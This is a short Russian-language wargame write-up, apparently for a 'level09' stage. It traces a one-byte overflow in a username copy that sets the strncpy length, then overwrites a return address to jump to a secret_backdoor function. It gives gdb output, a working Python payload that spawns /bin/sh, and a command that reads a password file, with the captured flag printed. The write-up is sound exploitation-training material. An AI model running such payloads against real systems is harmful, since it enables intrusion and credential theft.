В main вызывается функция handle_msg, в которой создается структура, где 140 байт выделяется под msg и 40 байт под username и len.
В handle_msg нас интересуют 2 функции - set_username и set_msg.

Функция fgets (в set_username) считывает пользовательский ввод (128 байт) в локальный буфер по адресу 0x7fffffffe470:
0x0000555555554a38 <+107>:   callq  0x555555554770 <fgets@plt>

После чего осуществляется побайтное копирование 41 байта из локального буфера в структуру.

0x0000555555554a6a <+157>:   cmpl   $0x28,-0x4(%rbp)
0x0000555555554a6e <+161>:   jg     0x555555554a81 <set_username+180>

Таким образом, можно попробовать подать username размером 41 байт, тем самым превысив выделенную в структуре память на 1 байт.

Можно заметить, что как раз этот 1 байт используется в качестве n (кол-во символов для копирования) в strncpy, которая будет в дальнейшем копировать msg из локального 1024 байтного буфера в структуру.

Таким образом, мы можем подать произвольное кол-во символов для копирования. 

В info function видим функцию, которая содержит system - secret_backdoor.
Благодаря уязвимости, обнаруженной на предыдущем шаге, перезапишем байты по адресу 0x7fffffffe5d8 (адрес возврата) на адрес функции backdoor.

(gdb) p secret_backdoor
$16 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>


(python -c "print 'A'*40 + '\xff' + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + '/bin/sh'"; cat) | ./level09

cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
